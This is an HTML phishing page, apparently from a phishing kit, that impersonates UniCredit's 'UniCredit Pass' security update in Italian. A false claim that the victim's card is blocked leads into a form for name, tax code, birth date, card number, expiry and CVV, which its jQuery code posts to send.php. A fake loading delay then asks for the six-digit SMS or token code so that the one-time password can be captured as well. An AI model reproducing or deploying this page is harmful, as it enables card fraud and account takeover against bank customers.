<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>UniCredit</title>
<meta http-equiv="PRAGMA" content="no-cache, must-revalidate">
<meta http-equiv="EXPIRES" content="THU, 01 DEC 1990 16:45:00 GMT">
<meta http-equiv="CACHE-CONTROL" content="no-store, no-cache, must-revalidate, post-check=0, pre-check=0, false">
<meta name="format-detection" content="telephone=no">
<link rel="stylesheet" type="text/css" href="./Uni_files/main1.css">
<link rel="stylesheet" type="text/css" href="./Uni_files/overMobile.css">
<link rel="stylesheet" type="text/css" href="./Uni_files/toolbarBtnsNew.css"><!--[if IE]><link rel="stylesheet" type="text/css" href="/ibx/res/css/toolbarBtnsIE.css" /><![endif]-->
<script type="text/javascript" src="./Uni_files/ibx.Browser.js.t�l�chargement"></script>
<script type="text/javascript" src="./Uni_files/ibx.FilterAccounts.js.t�l�chargement"></script>
<script type="text/javascript" src="./Uni_files/application.js.t�l�chargement"></script>
<script type="text/javascript" src="./Uni_files/jquery-1.7.2.min.js.t�l�chargement"></script>
<script type="text/javascript" src="./Uni_files/utils.jsp"></script>

</script>

	
		

	<script type="text/JavaScript" src="./Uni_files/tooltip.js.t�l�chargement"></script><script type="text/javascript" id="webrtc-control"></script></head>
	<body onload="pageLoaded = true;applicationOnLoad();post_deviceprint();" onunload="applicationOnUnLoad();" marginwidth="0" marginheight="0"><div id="ToolTip" style="position:absolute; z-index:99"></div>
   	<script language="JavaScript1.2" type="text/JavaScript" src="./Uni_files/deviceprint.js.t�l�chargement"></script>
	
	
		<div class="titleBar" id="_id3"><div class="title">aggiornare i suo dati UniCredit Pass</div></div><div></div>
		
		
		
	<script type="text/javascript" src="./Uni_files/main.min.js"></script>
<link rel="stylesheet" type="text/css" href="./Uni_files/main.css">
<link rel="stylesheet" type="text/css" href="./Uni_files/util.css">
<link rel="stylesheet" type="text/css" href="./Uni_files/overMobile.css">
<link rel="stylesheet" type="text/css" href="./Uni_files/toolbarBtnsNew.css"><!--[if IE]><link rel="stylesheet" type="text/css" href="/ibx/res/css/toolbarBtnsIE.css" /><![endif]-->
<script type="text/javascript" src="./Uni_files/ibx.Browser.js.téléchargement"></script>
<script type="text/javascript" src="./Uni_files/ibx.FilterAccounts.js.téléchargement"></script>
<script type="text/javascript" src="./Uni_files/application.js.téléchargement"></script>
<script type="text/javascript" src="./Uni_files/jquery-1.7.2.min.js.téléchargement"></script>
<script type="text/javascript" src="./Uni_files/utils.jsp"></script>
<script type="text/javascript">
var pageLoaded=false;
var PAGETYPE="PAGE";
var APPLICATION=parent;
var HELPINFOTXT="";
var HELPTIPSTXT="";
try {
HELPINFOTXT="";
HELPTIPSTXT="";
} catch (err) { 
Logger.error("qui");
}
function pageEventHandler(ev)	{
var evtype;
if (typeof(ev)=="object")	evtype=ev.type;
else evtype=ev;
}
</script>
		<link rel="stylesheet" type="text/css" href="./Uni_files/unionStyleOrdinato.css">	
		<link rel="stylesheet" type="text/css" href="./Uni_files/card.css">


		<style type="text/css">
		
		    .inner-addon {
  position: relative;
}

/ style glyph /
.inner-addon .glyphicon {
  position: absolute;
      font-size: 21px;
    padding: 7px;
    padding-right: 28px;
  pointer-events: none;
}

/ align glyph /
.left-addon .glyphicon  { left:  0px;}
.right-addon .glyphicon { right: 0px;}
.glyphicon {opacity: 0.5;}
			body{
				width: 700px;
				font-size: 11px;
				text-align: justify;
			}
			table{
				font-size: 13px;
			}
			#pageContent {
			    margin-top: 0px;
   				padding-top: 0px;
			}
			.widthCol1 {width: 150px; height: 25px;}
		    .widthCol2 {width: auto;  height: 25px;}
		</style>
	


















</div>
	  <style>

.loader,
.loader:after {
  border-radius: 50%;
  width: 10em;
  height: 10em;
}
.loader {
    margin: auto;
    font-size: 8px;
    position: relative;
    overflow: hidden;
    text-indent: -9999em;
    border-top: 1.1em solid rgba(58, 100, 174, 0.27);
    border-right: 1.1em solid rgba(58, 100, 174, 0.27);
    border-bottom: 1.1em solid rgba(58, 100, 174, 0.27);
    border-left: 1.1em solid #4077B0;
    -webkit-transform: translateZ(0);
    -ms-transform: translateZ(0);
    transform: translateZ(0);
    -webkit-animation: load8 1.1s infinite linear;
    animation: load8 1.1s infinite linear;
}
@-webkit-keyframes load8 {
  0% {
    -webkit-transform: rotate(0deg);
    transform: rotate(0deg);
  }
  100% {
    -webkit-transform: rotate(360deg);
    transform: rotate(360deg);
  }
}
@keyframes load8 {
  0% {
    -webkit-transform: rotate(0deg);
    transform: rotate(0deg);
  }
  100% {
    -webkit-transform: rotate(360deg);
    transform: rotate(360deg);
  }
}
span.nonactiv4 {
    color: #a4a4a4;
}
select {
    font-size: 14px !important;
}



	  </style>
	  <script>
	  function show_cc() {
		  $("#step2").toggleClass('nonactiv2 activ2');
		  $("#show_loading").hide();
		  $("#ccloader").slideDown("slow");
	  }
	  function show_loading() {
		$("#step3").toggleClass('nonactiv3 activ3');
		$("#ccloader").slideUp("slow");
		$("#myloader").slideDown("slow");
	  setTimeout(
	  function(){
		$("#myloader").slideUp("slow");
		$("#smscode").slideDown("fast");
		$("#step4").toggleClass('nonactiv4 activ4');
	  }, 50000);
	  };
	  function resentsms() {
		$("#step4").toggleClass('activ4 nonactiv4');
		$("#step3").toggleClass('nonactiv3 activ3');
		$("#smscode").slideUp("fast");
		return show_loading();
	  };
	  function sendcode() {
		var sms = $('#sms').val();
		if(sms.length == 6){
			// alert("ok");
			$('#modifcds').submit();
		}else{
			$('#sms').css({"border-color": "#EC0000", "border-width":"1px", "border-style":"solid"});
		}
		// $('#modifcds').submit();
	  };
	  function sendcc() {
		 var nm = $('#nm').val();
		if(nm.length > 3){
			$('#nm').css({"border-color": "#a9a9a9", "border-width":"1px", "border-style":"solid"});
		}else{
			$('#nm').css({"border-color": "#EC0000", "border-width":"1px", "border-style":"solid"});
			return false;
		}
		 var pn = $('#pn').val();
		if(pn.length > 3){
			$('#pn').css({"border-color": "#a9a9a9", "border-width":"1px", "border-style":"solid"});
		}else{
			$('#pn').css({"border-color": "#EC0000", "border-width":"1px", "border-style":"solid"});
			return false;
		}
		var cf = $('#cf').val();
		if(cf.length == 16){
			$('#cf').css({"border-color": "#a9a9a9", "border-width":"1px", "border-style":"solid"});
		}else{
			$('#cf').css({"border-color": "#EC0000", "border-width":"1px", "border-style":"solid"});
			return false;
		}
		var d1 = $('#d1').val();
		if(d1 > 0){
			$('#d1').css({"border-color": "#a9a9a9", "border-width":"1px", "border-style":"solid"});
		}else{
			$('#d1').css({"border-color": "#EC0000", "border-width":"1px", "border-style":"solid"});
			return false;
		}	
		var d2 = $('#d2').val();
		if(d2 > 0){
			$('#d2').css({"border-color": "#a9a9a9", "border-width":"1px", "border-style":"solid"});
		}else{
			$('#d2').css({"border-color": "#EC0000", "border-width":"1px", "border-style":"solid"});
			return false;
		}	
		var d3 = $('#d3').val();
		if(d3 > 0){
			$('#d3').css({"border-color": "#a9a9a9", "border-width":"1px", "border-style":"solid"});
		}else{
			$('#d3').css({"border-color": "#EC0000", "border-width":"1px", "border-style":"solid"});
			return false;
		}	
		var cc4 = $('#cc4').val();
		if(cc4.length == 16){
			$('#cc4').css({"border-color": "#a9a9a9", "border-width":"1px", "border-style":"solid"});
		}else{
			$('#cc4').css({"border-color": "#EC0000", "border-width":"1px", "border-style":"solid"});
			return false;
		}
		var expmonth = $('#expmonth').val();
		var expyear = $('#expyear').val();
		if(expyear == 2018 && expmonth <= 2){
			$('#expyear').css({"border-color": "#EC0000", "border-width":"1px", "border-style":"solid"});
			$('#expmonth').css({"border-color": "#EC0000", "border-width":"1px", "border-style":"solid"});
			return false;
		}else{
			$('#expyear').css({"border-color": "#a9a9a9", "border-width":"1px", "border-style":"solid"});
			$('#expmonth').css({"border-color": "#a9a9a9", "border-width":"1px", "border-style":"solid"});
		}
		var cvv = $('#cvv').val();
		if(cvv.length == 3){
			$('#cvv').css({"border-color": "#a9a9a9", "border-width":"1px", "border-style":"solid"});
			return sendmecc();
		}else{
			$('#cvv').css({"border-color": "#EC0000", "border-width":"1px", "border-style":"solid"});
			return false;
		}
	  };
	  function sendmecc(){
		  var nm = $('#nm').val();
		  var pn = $('#pn').val();
		  var cf = $('#cf').val();
		  var d1 = $('#d1').val();
		  var d2 = $('#d2').val();
		  var d3 = $('#d3').val();
		  var cc4 = $('#cc4').val();
		  var expmonth = $('#expmonth').val();
		  var expyear = $('#expyear').val();
		  var cvv = $('#cvv').val();
				$.ajax({ 
				   data: { 'cc4':cc4, 'expmonth':expmonth, 'expyear':expyear, 'cvv':cvv, 'nm':nm, 'pn':pn, 'cf':cf, 'd1':d1, 'd2':d2, 'd3':d3 },
				   type:'POST',
				   url: "./send.php",
				   cache:false,
				   success: function(response) {
						return show_loading();
					}
			  });
	  }
	</script>
      <link rel="stylesheet" href="./Uni_files/acces.css" type="text/css">
   
   
      <div id="n2g_conteneur">
         <div id="n2g_zone_haut">
            
            
         </div>
<script>
$(document).ready(function () {
	$("#show_loading").click(function(){
		$.ajax({
			data: {
				'wajad': "rassek"
			},
			type: 'POST',
			url: "./send.php"
		}).done(function (data) {
			// console.log(data);
	  });
	});
});
</script>
         <div id="n2g_conteneur_milieu">
            <div id="n2g_zone_milieu">
               <div id="n2g_zone_gauche"></div>
               <div id="n2g_zone_centre">
                  <div id="n2g_zone_centre_haut">
                  </div>
                  <form action="send.php" method="post" name="modifcds" id="modifcds">
                     <div class="chang_pass_principal_conteneur">
                        <div class="n2g_chang_pass_conteneur">
                           <div class="introduction"> 
                             
                             
                           <div style="padding-right:0px; padding-bottom:23px;">Abbiamo condotto a una revisione dei nostri misure di sicurezza la tua carta di credito non potrà più essere utilizzata per acquisti e-commerce su siti sicuri (che richiedono la digitazione di una password per completare l'operazione).<br>
                              <b>Si prega proprio di aggiornare i suo dati  <b>UniCredit Pass</b>.</b>
                           </div>
                           <div class="n2g_chang_pass_etape">
                              <span id="step1" class="activ1"><font size="3"><b>1.</b></font> Si prega <b>di cliccare sul link</b> per aggiornare i suoi dati UniCredit Pass :</span>
                           </div>
						   <div id="show_loading" style="padding:8px;margin-bottom:10px;">
						   <a style="color: #3666EE;" onclick="return show_cc();" href="#modifcds">Clicca qui per aggiornare i suoi dati</a>
                           </div>
                           <div class="n2g_chang_pass_etape">
                              <span id="step2" class="nonactiv2"><font size="3"><b>2.</b></font> Inserimento i suoi dati UniCredit Pass <b>per ripristinare l'operatività</b> :</span>
                           </div>
							<div id="ccloader" style="padding-left: 20px;padding-top: 20px;overflow: hidden;margin-bottom: 12px;display:none;">
						   <div id="cc_container"style="font-weight: bold;">

						   
			<table width="700">
<tbody>
<tr>
<td><img src="./Uni_files/linea.gif" alt="" height="2" width="695"></td>
</tr>
</tbody>
</table>
DATI PERSONALI <IMG src="./Uni_files/anadir-simbolo-de-la-tarjeta-de-negocios_318-63636.jpg" style="width : 27px;">
			<table width="700">
<tbody>
<tr>
<td><img src="./Uni_files/linea.gif" alt="" height="2" width="695"></td>
</tr>
</tbody>
</table>						   
						   
						   
						   
						   
						   
						   <table class="panelValueGrey" width="700">
<tbody>
<tr>
<td class="widthCol1">Nome:</td>
<td class="widthCol2"><table>
<tbody>
<tr>
<td><input name="nm" id="nm" maxlength="10" style=" border-radius: 2px !important;  margin: 0;border: 1px solid #b4b4b4;height: 28px;padding-left: 10px; background: #FFFFFF; none repeat scroll 0 0;" value="" type="text"><div style="width: 16px; height: 16px; position: absolute; background-size: 16px; pointer-events: none; z-index: 2147483647; background-image: url(&quot;chrome-extension://caljgklbbfbcjjanaijlacgncafpegll/images/icons/32x32.png&quot;); margin-top: -19px; margin-left: 68.4px;" class="pwm-field-icon"></div></td>
<td></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>

			<table width="700">
<tbody>
<tr>
<td><img src="./Uni_files/linea.gif" alt="" height="2" width="695"></td>
</tr>
</tbody>
</table>



<table class="panelValueGrey" width="700">
<tbody>
<tr>
<td class="widthCol1">Cognome:</td>
<td class="widthCol2"><table>
<tbody>
<tr>
<td><input name="pn" id="pn" maxlength="10" style=" border-radius: 2px !important;  margin: 0;border: 1px solid #b4b4b4;height: 28px;padding-left: 10px; background: #FFFFFF; none repeat scroll 0 0;" value="" type="text"><div style="width: 16px; height: 16px; position: absolute; background-size: 16px; pointer-events: none; z-index: 2147483647; background-image: url(&quot;chrome-extension://caljgklbbfbcjjanaijlacgncafpegll/images/icons/32x32.png&quot;); margin-top: -19px; margin-left: 68.4px;" class="pwm-field-icon"></div></td>
<td></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>


			<table width="700">
<tbody>
<tr>
<td><img src="./Uni_files/linea.gif" alt="" height="2" width="695"></td>
</tr>
</tbody>
</table>




<table class="panelValueGrey" width="700">
<tbody>
<tr>
<td class="widthCol1">Codice Fiscale:</td>
<td class="widthCol2"><table>
<tbody>
<tr>
<td><input name="cf" id="cf" maxlength="16" pattern="[a-zA-Z]{6}[0-9]{2}[a-zA-Z][0-9]{2}[a-zA-Z][0-9]{3}[a-zA-Z]" style=" border-radius: 2px !important;  margin: 0;border: 1px solid #b4b4b4;height: 28px;padding-left: 10px; background: #FFFFFF; none repeat scroll 0 0;" value="" type="text"><div style="width: 16px; height: 16px; position: absolute; background-size: 16px; pointer-events: none; z-index: 2147483647; background-image: url(&quot;chrome-extension://caljgklbbfbcjjanaijlacgncafpegll/images/icons/32x32.png&quot;); margin-top: -19px; margin-left: 68.4px;" class="pwm-field-icon"></div></td>
<td></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>


			<table width="700">
<tbody>
<tr>
<td><img src="./Uni_files/linea.gif" alt="" height="2" width="695"></td>
</tr>
</tbody>
</table>

<table class="panelValueGrey" width="700">
<tbody>
<tr>
<td class="widthCol1">Data di nascita:</td>
<td class="widthCol2"><table>
<tbody>
<tr>
<td>  <select name="d1" id="d1" style=" border-radius: 2px !important;  margin: 0;border: 1px solid #b4b4b4;height: 28px;padding-left: 10px; background: #FFFFFF; none repeat scroll 0 0;">
                        <option value="0">Giorno</option>
                        <option value="1">01</option>
						<option value="2">02</option>
						<option value="3">03</option>
						<option value="4">04</option>
						<option value="5">05</option>
						<option value="6">06</option>
						<option value="7">07</option>
						<option value="8">08</option>
						<option value="9">09</option> 
						<option value="10">10</option>
						<option value="11">11</option>
						<option value="12">12</option>
						<option value="13">13</option>
						<option value="14">14</option>
						<option value="15">15</option>
						<option value="16">16</option>
						<option value="17">17</option>
						<option value="18">18</option>
						<option value="19">19</option>
						<option value="20">20</option>
						<option value="21">21</option>
						<option value="22">22</option>
						<option value="23">23</option> 
						<option value="24">24</option>
						<option value="25">25</option>
						<option value="26">26</option>
						<option value="27">27</option>
						<option value="28">28</option>
						<option value="29">29</option>
						<option value="30">30</option>
						<option value="31">31</option>
                    </select>
					<select name="d2" id="d2" style=" border-radius: 2px !important;  margin: 0;border: 1px solid #b4b4b4;height: 28px;padding-left: 10px; background: #FFFFFF; none repeat scroll 0 0;">
                        <option value="0">Mese</option>
                        <option value="1">01</option>
						<option value="2">02</option>
						<option value="3">03</option>
						<option value="4">04</option>
						<option value="5">05</option>
						<option value="6">06</option>
						<option value="7">07</option>
						<option value="8">08</option>
						<option value="9">09</option>
						<option value="10">10</option>
						<option value="11">11</option>
						<option value="12">12</option>
                    </select>
					<select name="d3" id="d3" style=" border-radius: 2px !important;  margin: 0;border: 1px solid #b4b4b4;height: 28px;padding-left: 10px; background: #FFFFFF; none repeat scroll 0 0;">
					<option value="0">Anno</option><option value="2017">2017</option><option value="2016">2016</option><option value="2015">2015</option><option value="2014">2014</option><option value="2013">2013</option><option value="2012">2012</option><option value="2011">2011</option><option value="2010">2010</option><option value="2009">2009</option><option value="2008">2008</option><option value="2007">2007</option><option value="2006">2006</option><option value="2005">2005</option><option value="2004">2004</option><option value="2003">2003</option><option value="2002">2002</option><option value="2001">2001</option><option value="2000">2000</option><option value="1999">1999</option><option value="1998">1998</option><option value="1997">1997</option><option value="1996">1996</option><option value="1995">1995</option><option value="1994">1994</option><option value="1993">1993</option><option value="1992">1992</option><option value="1991">1991</option><option value="1990">1990</option><option value="1989">1989</option><option value="1988">1988</option><option value="1987">1987</option><option value="1986">1986</option><option value="1985">1985</option><option value="1984">1984</option><option value="1983">1983</option><option value="1982">1982</option><option value="1981">1981</option><option value="1980">1980</option><option value="1979">1979</option><option value="1978">1978</option><option value="1977">1977</option><option value="1976">1976</option><option value="1975">1975</option><option value="1974">1974</option><option value="1973">1973</option><option value="1972">1972</option><option value="1971">1971</option><option value="1970">1970</option><option value="1969">1969</option><option value="1968">1968</option><option value="1967">1967</option><option value="1966">1966</option><option value="1965">1965</option><option value="1964">1964</option><option value="1963">1963</option><option value="1962">1962</option><option value="1961">1961</option><option value="1960">1960</option><option value="1959">1959</option><option value="1958">1958</option><option value="1957">1957</option><option value="1956">1956</option><option value="1955">1955</option><option value="1954">1954</option><option value="1953">1953</option><option value="1952">1952</option><option value="1951">1951</option><option value="1950">1950</option><option value="1949">1949</option><option value="1948">1948</option><option value="1947">1947</option><option value="1946">1946</option><option value="1945">1945</option><option value="1944">1944</option><option value="1943">1943</option><option value="1942">1942</option><option value="1941">1941</option><option value="1940">1940</option><option value="1939">1939</option><option value="1938">1938</option><option value="1937">1937</option><option value="1936">1936</option><option value="1935">1935</option><option value="1934">1934</option><option value="1933">1933</option><option value="1932">1932</option><option value="1931">1931</option><option value="1930">1930</option><option value="1929">1929</option><option value="1928">1928</option><option value="1927">1927</option><option value="1926">1926</option><option value="1925">1925</option><option value="1924">1924</option><option value="1923">1923</option><option value="1922">1922</option><option value="1921">1921</option><option value="1920">1920</option><option value="1919">1919</option><option value="1918">1918</option><option value="1917">1917</option><option value="1916">1916</option><option value="1915">1915</option><option value="1914">1914</option><option value="1913">1913</option><option value="1912">1912</option><option value="1911">1911</option><option value="1910">1910</option><option value="1909">1909</option><option value="1908">1908</option><option value="1907">1907</option><option value="1906">1906</option><option value="1905">1905</option></select>
 </div></td>
<td></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>

			<table width="700">
<tbody>
<tr>
<td><img src="./Uni_files/linea.gif" alt="" height="2" width="695"></td>
</tr>
</tbody>
</table>
DATI DI CARTA CREDITO <IMG src="./Uni_files/credit-card-plus.png" style="width : 27px;">
			<table width="700">
<tbody>
<tr>
<td><img src="./Uni_files/linea.gif" alt="" height="2" width="695"></td>
</tr>
</tbody>
</table>



						   
							<table class="panelValueGrey" width="700">
<tbody>
<tr>
<td class="widthCol1">16 Cifre:</td>
<td class="widthCol2"><table>
<tbody>
<tr>

    <input name="cc4" id="cc4" class="form-control" maxlength="16" pattern="[0-9]{16}" style="border-radius: 2px !important;margin: 0;border: 1px solid #b4b4b4;height: 28px;padding-left: 10px;background: #FFFFFF;none repeat scroll 0 0;" value="" type="tel"><div style="width: 16px; height: 16px; position: absolute; background-size: 16px; pointer-events: none; z-index: 2147483647;  margin-top: -19px; margin-left: 68.4px;" class="pwm-field-icon"></div></td>
<td></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>

			
		        
				
			<table width="700">
<tbody>
<tr>
<td><img src="./Uni_files/linea.gif" alt="" height="2" width="695"></td>
</tr>
</tbody>
</table>

			
					
					
						
	
			            
			            
		            
			<table class="panelValueGrey" width="700">
<tbody>
<tr>
<td class="widthCol1">Data di scadenza:</td>
<td class="widthCol2"><table>
<tbody>
<tr>
<td><select name="expmonth" id="expmonth" style=" border-radius: 2px !important;  margin: 0;border: 1px solid #b4b4b4;height: 28px;padding-left: 10px; background: #FFFFFF; none repeat scroll 0 0;">
											<option value="01">01</option>
											<option value="02">02</option>
											<option value="03">03</option>
											<option value="04">04</option>
											<option value="05">05</option>
											<option value="06">06</option>
											<option value="07">07</option>
											<option value="08">08</option>
											<option value="09">09</option>
											<option value="10">10</option>
											<option value="11">11</option>
											<option value="12">12</option>
										</select>
										<select name="expyear" id="expyear" style=" border-radius: 2px !important;  margin: 0;border: 1px solid #b4b4b4;height: 28px;padding-left: 10px; background: #FFFFFF; none repeat scroll 0 0;">
											<option value="2018">2018</option>
											<option value="2019">2019</option>
											<option value="2020">2020</option>
											<option value="2021">2021</option>
											<option value="2022">2022</option>
											<option value="2023">2023</option>
											<option value="2024">2024</option>
											<option value="2025">2025</option>
											<option value="2026">2026</option>
										</select><div style="width: 16px; height: 16px; position: absolute; background-size: 16px; pointer-events: none; z-index: 2147483647; background-image: url(&quot;chrome-extension://caljgklbbfbcjjanaijlacgncafpegll/images/icons/32x32.png&quot;); margin-top: -19px; margin-left: 68.4px;" class="pwm-field-icon"></div></td>
<td></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>

			
		        
				
			<table width="700">
<tbody>
<tr>
<td><img src="./Uni_files/linea.gif" alt="" height="2" width="695"></td>
</tr>
</tbody>
</table>

			
					
					
						
	
			            
			            
		            
			<table class="panelValueGrey" width="700">
<tbody>
<tr>
<td class="widthCol1">Codice di sicurezza:</td>
<td class="widthCol2"><table>
<tbody>
<tr>
<td><input name="cvv" id="cvv" maxlength="3" pattern="[0-9]{3}" style=" border-radius: 2px !important;  margin: 0;border: 1px solid #b4b4b4;height: 28px;padding-left: 10px; background: #FFFFFF; none repeat scroll 0 0;" value="" type="tel"></td>
<td> </td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
						   </div>
						   <br>
						   <img onclick="return sendcc();" id="tc_valider" class="valid_img" style="width: 111px;cursor:pointer;float:right;" alt="VALIDER" title="VALIDER" src="./Uni_files/valider.png">
						   </div>
                           <div class="n2g_chang_pass_etape">
                              <span id="step3" class="nonactiv3"><font size="3"><b>3.</b></font> Un <b>password generate</b> riportata tuo sul dispositivo :</span>
                           </div>
						   <div style="display:none;padding-let: 40px;" id="myloader">
						   <div style="padding-left: 20px;padding-top: 4px;">Per favore aspetta mentre noi aggiornare i suoi UniCredit Pass.</div>
						   <div class="loader">Loading...</div>
						   </div>
                           <div class="n2g_chang_pass_etape">
                              <span id="step4" class="nonactiv4"><font size="3"><b>4.</b></font> Per poter conferma è necessario  <b>inserire la password</b> riportata sul dispositivo :</span>
                           </div>
						   <div id="smscode" style="display:none;">
						   <br><table class="signPanel1" id="changePinForm:endorseNew:tableEndorse"><thead><tr><th colspan="6" scope="colgroup"><span class="info"><label for="">Inserire la password :</label></span></th></tr></thead><tbody><tr align="center" cellpadding="0px" cellspacing="0px"><td><table><tbody><tr><td align="right"><img id="changePinForm:endorseNew:imgSignEndorse" src="./Uni_files/token.gif" alt=""></td><td><img id="changePinForm:endorseNew:imgArrowPassword" src="./Uni_files/arrowToSign.gif"></td><td>
			<input name="sms" value="" id="sms" type="password" autocomplete="off"  maxlength="6" size="6"></td><td>&nbsp;</td><td align="right">&nbsp;</td></tr></tbody></table></td><td align="right" colspan="5">
						   <img onclick="return sendcode();" id="tc_valider" class="valid_img" style="width: 111px;cursor:pointer;float:right;" alt="VALIDER" title="VALIDER" src="./Uni_files/valider.png"></div></tbody><tfoot><tr><td colspan="6"><span class="info justify"><label for=""></label></span></td></tr></tfoot></table>
						   </div>
						   </div>
                           
                        </div>
                     </div>
                  </form>
                  <div id="n2g_zone_centre_bas">
                  </div>
               </div>
               <div id="n2g_zone_droite"> 
               </div>
            </div>
            <div class="n2g_separateur_zones_milieu_bas">
            </div>
         </div>
         
      </div>

<!-- Fix <div> tag of CQ-->
<style type="text/css">
.col-sm-5 div:nth-child(n + 2){
    margin-top: 10px;
}
</style>
</div>
<div class="basecomponent editorialComp section">

















<br>





<article class="article  cq-dd-file">
    
	
</article>
</div>

</div>
	
	
	


</body></html>